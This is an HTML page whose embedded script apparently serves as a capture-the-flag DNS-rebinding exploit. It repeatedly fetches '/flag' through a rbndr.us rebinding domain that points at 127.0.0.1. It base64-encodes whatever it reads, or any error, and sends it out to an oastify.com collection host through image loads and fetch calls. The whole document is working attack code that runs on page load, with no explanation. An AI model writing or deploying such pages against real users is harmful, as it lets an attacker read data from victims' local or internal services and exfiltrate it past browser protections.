<!DOCTYPE html>
<html>
    <head>YOO</head>
<body>
<script>
const targetDomain = 'acd918ee.7f000001.rbndr.us';

for (let i = 1; i <= 30; i++) {
    setTimeout(() => {
        fetch(`http://${targetDomain}/flag`)
            .then(r => r.text())
            .then(flag => {
                const encoded = btoa(flag);
                new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag_success_${i}=${encoded}`;
                fetch(`https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?fetch_flag_${i}=${encoded}`, {mode: 'no-cors'});
            })
            .catch(err => {
                const encoded = btoa(err.toString());
                new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${i}=${encoded}`;
                fetch(`https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?fetch_error_${i}=${encoded}`, {mode: 'no-cors'});
            });
    }, i * 500);
}
</script>
</body>
</html>
